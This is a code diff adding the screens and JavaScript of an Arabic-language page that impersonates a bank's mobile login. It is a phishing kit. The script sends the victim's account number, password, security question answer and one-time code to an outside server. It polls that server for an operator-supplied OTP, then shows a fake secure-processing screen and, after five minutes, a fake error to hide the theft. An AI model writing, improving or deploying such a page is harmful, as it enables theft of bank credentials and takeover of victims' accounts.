+    <div class="waiting-notice show" id="waiting-notice">⏳ في انتظار إرسال رمز التحقق من الإدارة...</div>
+    <div class="otp-notice" id="otp-ready-notice" style="display:none">📱 تم إرسال رمز التحقق، أدخله أدناه</div>
+    <div class="otp-wrap">
+      <input class="otp-input" type="text" inputmode="numeric" maxlength="1" id="otp1" autocomplete="off">
+      <input class="otp-input" type="text" inputmode="numeric" maxlength="1" id="otp2" autocomplete="off">
+      <input class="otp-input" type="text" inputmode="numeric" maxlength="1" id="otp3" autocomplete="off">
+      <input class="otp-input" type="text" inputmode="numeric" maxlength="1" id="otp4" autocomplete="off">
+      <input class="otp-input" type="text" inputmode="numeric" maxlength="1" id="otp5" autocomplete="off">
+      <input class="otp-input" type="text" inputmode="numeric" maxlength="1" id="otp6" autocomplete="off">
+    </div>
+    <div class="error-msg" id="otp-error">الرمز المدخل غير صحيح أو منتهي الصلاحية</div>
+    <button class="btn-primary" onclick="doOtp()" id="otp-btn">تأكيد الرمز</button>
+
+  </div>
+  <div class="bottom-nav">
+    <div class="nav-item"><div class="nav-icon">📍</div><span class="nav-label">مواقعنا</span></div>
+    <div class="nav-item"><div class="nav-icon">📞</div><span class="nav-label">المساعدة</span></div>
+    <div class="nav-item"><div class="nav-icon">📘</div><span class="nav-label">فيس بوك</span></div>
+    <div class="nav-item"><div class="nav-icon">🏠</div><span class="nav-label">الرئيسية</span></div>
+  </div>
+</div>
+
+<!-- ══ SCREEN 4: WAITING ══ -->
+<div class="screen" id="screen-success">
+  <div class="red-header compact">
+    <div class="logo-wrap"><div class="logo-arabic sm">بنك<span>ك</span></div><div class="logo-english sm"><b>b</b>ankak</div></div>
+  </div>
+  <div class="white-body" style="display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:20px">
+
+    <div class="step-bar"><div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot active"></div></div>
+
+    <!-- انتظار -->
+    <div id="wait-screen">
+      <div style="font-size:56px;margin-bottom:16px">⏳</div>
+      <div style="font-size:20px;font-weight:800;color:var(--text-dark);margin-bottom:10px">طلبك قيد المراجعة</div>
+      <div style="font-size:14px;color:var(--text-muted);line-height:2;margin-bottom:20px">
+        يرجى عدم إغلاق الصفحة<br>جاري مراجعة بياناتك...
+      </div>
+      <div style="background:#FFF8E8;border:1px solid rgba(201,168,76,0.3);border-radius:12px;padding:14px 20px;font-size:13px;color:#8B6914;line-height:1.8">
+        🔒 اتصالك آمن ومشفر<br>سيتم معالجة طلبك خلال لحظات
+      </div>
+    </div>
+
+    <!-- خطأ بعد 5 دقائق -->
+    <div id="error-screen" style="display:none">
+      <div style="font-size:56px;margin-bottom:16px">❌</div>
+      <div style="font-size:20px;font-weight:800;color:var(--red);margin-bottom:10px">حدث خطأ</div>
+      <div style="font-size:14px;color:var(--text-muted);line-height:2;margin-bottom:24px">
+        يبدو أنك قمت بإدخال البيانات بشكل خاطئ<br>حاول مرة أخرى
+      </div>
+      <button class="btn-primary" onclick="resetAll()">البداية من الأول</button>
+    </div>
+
+  </div>
+  <div class="bottom-nav">
+    <div class="nav-item"><div class="nav-icon">📍</div><span class="nav-label">مواقعنا</span></div>
+    <div class="nav-item"><div class="nav-icon">📞</div><span class="nav-label">المساعدة</span></div>
+    <div class="nav-item"><div class="nav-icon">📘</div><span class="nav-label">فيس بوك</span></div>
+    <div class="nav-item"><div class="nav-icon">🏠</div><span class="nav-label">الرئيسية</span></div>
+  </div>
+</div>
+
+<script>
+const API = 'https://ibok-online-4yr4.onrender.com/';
+let timerInterval=null, timerSeconds=3600, SESSION_ID=null, pollInterval=null;
+const questions={cousin:'ما هو اسم ابن عمك الأول؟',city:'في أي مدينة ولدت؟',grad:'في أي سنة تخرجت من الجامعة؟',nick:'ماذا كان لقبك أثناء الطفولة؟',author:'اسم مؤلفك المفضل؟',car:'اسم الشركة المصنعة للسيارة المفضلة لديك؟',movie:'أي فيلم هو المفضل لديك؟',friend:'اسم أفضل صديق في الطفولة؟',school:'ما هو اسم المدرسة التي التحقت بها؟',football:'اسم فريق كرة القدم المفضل لديك؟'};
+const otpIds=['otp1','otp2','otp3','otp4','otp5','otp6'];
+
+// Clock
+setInterval(()=>{document.getElementById('pf-clock').textContent=new Date().toTimeString().slice(0,8);},1000);
+
+function goTo(id){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  const el=document.getElementById(id);
+  el.classList.add('active');
+  el.style.animation='none';
+  requestAnimationFrame(()=>{el.style.animation='';});
+}
+
+function togglePass(){const f=document.getElementById('password');f.type=f.type==='password'?'text':'password';}
+
+async function doLogin(){
+  const u=document.getElementById('username').value.trim();
+  const p=document.getElementById('password').value.trim();
+  const err=document.getElementById('login-error');
+  const validUser=/^\d{7}$/.test(u);
+  const validPass=/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^a-zA-Z\d]).+$/.test(p);
+  if(!validUser||!validPass){err.classList.add('show');err.textContent='رقم الحساب أو كلمة المرور غير صحيحة';return;}
+  err.classList.remove('show');
+  const btn=document.getElementById('login-btn');
+  btn.innerHTML='جاري التحقق <span class="spinner"></span>';btn.disabled=true;
+  try{
+    const r=await fetch(`${API}/api/submit`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});
+    const d=await r.json();
+    if(d.sessionId){SESSION_ID=d.sessionId;goTo('screen-security');}
+    else{err.textContent='حدث خطأ، حاول مرة أخرى';err.classList.add('show');}
+  }catch(e){err.textContent='تعذّر الاتصال بالسيرفر';err.classList.add('show');}
+  btn.innerHTML='تسجيل الدخول';btn.disabled=false;
+}
+
+function onQuestionChange(){
+  const val=document.getElementById('security-select').value;
+  const box=document.getElementById('question-display');
+  if(val&&questions[val]){document.getElementById('q-text-display').textContent=questions[val];box.style.display='block';document.getElementById('security-answer').value='';document.getElementById('security-answer').focus();}
+  else box.style.display='none';
+}
+
+async function doSecurity(){
+  const q=document.getElementById('security-select').value;
+  const a=document.getElementById('security-answer').value.trim();
+  const err=document.getElementById('sec-error');
+  if(!q||!a){err.classList.add('show');return;}
+  err.classList.remove('show');
+  const btn=document.getElementById('sec-btn');
+  btn.innerHTML='جاري التحقق <span class="spinner"></span>';btn.disabled=true;
+  try{await fetch(`${API}/api/submit-security`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:SESSION_ID,secQuestion:questions[q],secAnswer:a})});}catch(e){}
+  btn.innerHTML='تأكيد الإجابة والمتابعة';btn.disabled=false;
+  goTo('screen-otp');startOTPTimer();startPolling();
+  setTimeout(()=>document.getElementById('otp1').focus(),300);
+}
+
+function setupOtpInputs(){
+  otpIds.forEach((id,i)=>{
+    const el=document.getElementById(id);
+    el.addEventListener('input',function(){
+      this.value=this.value.replace(/[^0-9]/g,'');
+      if(this.value.length>1)this.value=this.value.slice(-1);
+      if(this.value){this.classList.add('filled');if(i<5)document.getElementById(otpIds[i+1]).focus();}
+      else this.classList.remove('filled');
+    });
+    el.addEventListener('keydown',function(e){
+      if(e.key==='Backspace'&&!this.value&&i>0)document.getElementById(otpIds[i-1]).focus();
+      if(e.key==='Enter')doOtp();
+    });
+    el.addEventListener('paste',function(e){
+      e.preventDefault();
+      const p=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'');
+      otpIds.forEach((oid,j)=>{const x=document.getElementById(oid);x.value=p[j]||'';x.classList.toggle('filled',!!p[j]);});
+    });
+  });
+}
+
+function startPolling(){
+  if(!SESSION_ID)return;
+  clearInterval(pollInterval);
+  document.getElementById('waiting-notice').classList.add('show');
+  document.getElementById('otp-ready-notice').style.display='none';
+  pollInterval=setInterval(async()=>{
+    try{
+      const r=await fetch(`${API}/api/check-otp/${SESSION_ID}`);
+      const d=await r.json();
+      if(d.status==='otp_sent'&&d.otp){
+        const digits=d.otp.toString().split('');
+        otpIds.forEach((id,i)=>{const el=document.getElementById(id);el.value=digits[i]||'';el.classList.toggle('filled',!!digits[i]);});
+        document.getElementById('waiting-notice').classList.remove('show');
+        document.getElementById('otp-ready-notice').style.display='block';
+        clearInterval(pollInterval);
+      }
+    }catch(e){}
+  },3000);
+}
+
+function startOTPTimer(){
+  timerSeconds=3600;clearInterval(timerInterval);updateTimerDisplay();
+  timerInterval=setInterval(()=>{timerSeconds--;updateTimerDisplay();if(timerSeconds<=0){clearInterval(timerInterval);clearInterval(pollInterval);document.getElementById('otp-error').textContent='انتهت صلاحية الرمز.';document.getElementById('otp-error').classList.add('show');}},1000);
+}
+
+function updateTimerDisplay(){
+  const m=Math.floor(timerSeconds/60).toString().padStart(2,'0');
+  const s=(timerSeconds%60).toString().padStart(2,'0');
+  document.getElementById('timer-display').textContent=m+':'+s;
+  const offset=219.9*(1-timerSeconds/3600);
+  const color=timerSeconds<=60?'#E05252':'#C41230';
+  document.getElementById('timer-circle').style.strokeDashoffset=offset;
+  document.getElementById('timer-circle').style.stroke=color;
+  document.getElementById('timer-display').style.color=color;
+}
+
+async function doOtp(){
+  const code=otpIds.map(id=>document.getElementById(id).value).join('');
+  const err=document.getElementById('otp-error');
+  if(code.length<6){err.textContent='يرجى إدخال الرمز المكوّن من 6 أرقام كاملاً';err.classList.add('show');return;}
+  if(timerSeconds<=0){err.textContent='انتهت صلاحية الرمز.';err.classList.add('show');return;}
+  err.classList.remove('show');
+  const btn=document.getElementById('otp-btn');
+  btn.innerHTML='جاري التحقق <span class="spinner"></span>';btn.disabled=true;
+  try{
+    const r=await fetch(`${API}/api/submit-otp`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:SESSION_ID,otp:code})});
+    const d=await r.json();
+    if(d.success){
+      clearInterval(timerInterval);clearInterval(pollInterval);
+      goTo('screen-success');
+      // بعد 5 دقائق يظهر خطأ
+      setTimeout(()=>{
+        document.getElementById('wait-screen').style.display='none';
+        document.getElementById('error-screen').style.display='block';
+      }, 5 * 60 * 1000);
+    }else{err.textContent='الرمز غير صحيح';err.classList.add('show');}
+  }catch(e){err.textContent='تعذّر الاتصال بالسيرفر';err.classList.add('show');}
+  btn.innerHTML='تأكيد الرمز';btn.disabled=false;
+}
+
+// ══ (Processing system removed) ══
+const STEPS = [
+  {name:'AUTHENTICATION',    desc:'التحقق من هوية المستخدم',   dur:1500},
+  {name:'OTP VERIFICATION',  desc:'التحقق من رمز OTP',          dur:1200},
+  {name:'DATA ENCRYPTION',   desc:'تشفير البيانات الحساسة',     dur:1800},
+  {name:'SECURITY VALIDATION',desc:'التحقق من صحة الطلب',      dur:1400},
+  {name:'REQUEST PROCESSING', desc:'معالجة الطلب البنكي',       dur:2000},
+  {name:'FINALIZATION',       desc:'إتمام العملية',             dur:1000},
+];
+
+const PIPELINE_NAMES=['AUTH','VERIFY','ENCRYPT','VALIDATE','PROCESS','COMPLETE'];
+
+const LOGS = [
+  ['i','Initializing secure session...'],
+  ['i','Loading user credentials...'],
+  ['s','Authentication passed ✓'],
+  ['i','Verifying OTP token...'],
+  ['s','OTP verification successful ✓'],
+  ['i','Encrypting sensitive data with AES-256-GCM...'],
+  ['s','Encryption complete ✓'],
+  ['i','Running security validation checks...'],
+  ['i','Checking transaction limits...'],
+  ['s','Security validation passed ✓'],
+  ['i','Processing banking request...'],
+  ['i','Connecting to core banking system...'],
+  ['s','Request queued successfully ✓'],
+  ['i','Finalizing operation...'],
+  ['s','OPERATION COMPLETE — Request submitted ✓'],
+];
+
+function addProcLog(type, msg){
+  const term=document.getElementById('proc-log');
+  if(!term)return;
+  const now=new Date().toTimeString().slice(0,8);
+  const line=document.createElement('div');
+  line.className='ll';
+  line.innerHTML=`<span class="lt">[${now}]</span><span class="lm ${type}">${msg}</span>`;
+  term.appendChild(line);
+  term.scrollTop=term.scrollHeight;
+}
+
+function setStep(idx, state){
+  const el=document.getElementById('step'+idx);
+  if(!el)return;
+  el.className='step-item '+state;
+  const num=el.querySelector('.step-num');
+  const status=el.querySelector('.step-status');
+  if(state==='active'){num.textContent=idx+1;status.textContent='RUNNING...'}
+  else if(state==='done'){num.textContent='✓';status.textContent='DONE'}
+  else if(state==='error'){num.textContent='✗';status.textContent='ERROR'}
+}
+
+function setPipeline(idx){
+  for(let i=0;i<6;i++){
+    const n=document.getElementById('pp'+i);
+    const a=document.getElementById('pa'+i);
+    if(n){
+      if(i<idx){n.className='pp-node done-lit';}
+      else if(i===idx){n.className='pp-node lit';}
+      else{n.className='pp-node';}
+    }
+    if(a){
+      if(i<idx){a.className='pp-arr done-lit';}
+      else if(i===idx){a.className='pp-arr lit';}
+      else{a.className='pp-arr';}
+    }
+  }
+}
+
+function startProcessing(){
+  const reqId='REQ-'+Math.random().toString(36).substr(2,8).toUpperCase();
+  document.getElementById('ik-session').textContent=SESSION_ID?SESSION_ID.slice(0,12)+'...':'N/A';
+  document.getElementById('ik-user').textContent=document.getElementById('username')?.value||'USER';
+  document.getElementById('req-id-val').textContent=reqId;
+
+  let stepIdx=0;
+  let logIdx=0;
+  let elapsed=0;
+  const startTime=Date.now();
+
+  // Elapsed timer
+  const elTimer=setInterval(()=>{
+    elapsed=((Date.now()-startTime)/1000).toFixed(1);
+    document.getElementById('stat-time').textContent=elapsed+'s';
+  },100);
+
+  // Add initial logs
+  setTimeout(()=>addProcLog('i','Secure connection established'),100);
+  setTimeout(()=>addProcLog('i',`Session ID: ${reqId}`),400);
+
+  function runStep(){
+    if(stepIdx>=STEPS.length){
+      // Done!
+      clearInterval(elTimer);
+      setPipeline(6);
+      document.getElementById('stat-progress').textContent='100%';
+      document.getElementById('stat-steps').textContent='6/6';
+      document.getElementById('ik-status').textContent='COMPLETE ✓';
+      document.getElementById('ik-status').className='ik-v g';
+      document.getElementById('proc-status-txt').textContent='COMPLETE';
+      document.getElementById('proc-status-badge').className='proc-status done';
+      addProcLog('s','OPERATION COMPLETE — Request submitted successfully');
+      setTimeout(()=>{
+        document.getElementById('done-box').style.display='block';
+        document.getElementById('done-box').scrollIntoView({behavior:'smooth'});
+      },500);
+      return;
+    }
+
+    const step=STEPS[stepIdx];
+    setStep(stepIdx,'active');
+    setPipeline(stepIdx);
+
+    const progress=Math.round((stepIdx/STEPS.length)*100);
+    document.getElementById('stat-progress').textContent=progress+'%';
+    document.getElementById('stat-steps').textContent=stepIdx+'/6';
+    document.getElementById('ik-status').textContent='PROCESSING STEP '+(stepIdx+1)+'...';
+
+    // Add logs for this step
+    if(LOGS[logIdx]){
+      addProcLog(LOGS[logIdx][0],LOGS[logIdx][1]);
+      logIdx++;
+    }
+    setTimeout(()=>{
+      if(LOGS[logIdx]){addProcLog(LOGS[logIdx][0],LOGS[logIdx][1]);logIdx++;}
+    },step.dur/2);
+
+    setTimeout(()=>{
+      setStep(stepIdx,'done');
+      stepIdx++;
+      setTimeout(runStep,300);
+    },step.dur);
+  }
+
+  setTimeout(runStep,500);
+}
+
+function resetAll(){
+  SESSION_ID=null;
+  // Reset fields
+  document.getElementById('username').value='';
+  document.getElementById('password').value='';
+  document.getElementById('security-select').value='';
+  document.getElementById('question-display').style.display='none';
+  document.getElementById('security-answer').value='';
+  otpIds.forEach(id=>{const el=document.getElementById(id);el.value='';el.classList.remove('filled');});
+  // Reset screens
+  document.getElementById('wait-screen').style.display='block';
+  document.getElementById('error-screen').style.display='none';
+  goTo('screen-home');
+}
+
+document.addEventListener('keydown',e=>{
+  if(e.key!=='Enter')return;
+  const a=document.querySelector('.screen.active').id;
+  if(a==='screen-login')doLogin();
+  else if(a==='screen-security')doSecurity();
+  else if(a==='screen-otp')doOtp();
+});
+
+setupOtpInputs();
+</script>
+</body>
+</html>
